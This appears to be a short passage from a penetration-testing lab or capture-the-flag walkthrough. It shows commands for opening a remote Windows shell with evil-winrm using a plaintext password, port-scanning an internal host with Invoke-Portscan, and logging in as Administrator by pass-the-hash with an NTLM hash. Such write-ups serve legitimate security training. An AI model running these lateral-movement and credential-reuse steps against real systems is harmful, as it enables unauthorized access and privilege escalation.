`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`

evil-winrm -u Thomas -p i<3ruby -i 10.200.100.150

From here we can run a port scan on 10.200.100.100

`Invoke-Portscan -Hosts 10.200.100.100`

We can see that 80, 3389 are open

`evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.100.150`